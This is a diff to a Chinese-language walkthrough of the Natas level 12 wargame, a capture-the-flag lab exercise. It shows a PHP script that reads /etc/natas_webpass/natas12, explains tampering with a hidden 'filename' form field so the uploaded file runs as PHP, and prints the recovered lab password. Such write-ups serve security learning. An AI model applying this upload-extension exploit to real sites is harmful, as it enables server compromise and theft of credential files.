@@ -199,5 +199,22 @@ EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk/
 ```plain
 $target_path = "upload/<unique random string>.<ext>"
 ```
-注意到，其中的 `<ext>` 来自表单的 `filename` 字段，这为我们提供了突破口。
-2. 
+注意到，其中的 `<ext>` 来自表单中隐藏的 `filename` 字段，这为我们提供了突破口。
+2. 将文件上传到第一步生成的目标路径；
+3. 显示目标路径。
+
+根据上述逻辑，可以在本地构造 php 脚本：
+```php
+<?php
+$filename = '/etc/natas_webpass/natas12';
+$content = file_get_contents($filename);
+echo $content;
+?>
+```
+
+但直接上传后，拓展名会变成 `.jpg`，无法直接运行。因此，考虑利用 `filename` 字段注入 `php` 拓展名，提交脚本文件前修改 `filename` 字段的 `value` 属性的拓展名即可。
+
+访问生成的目标路径，就可以看到密码了。
+
+密码为：`EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng`
+
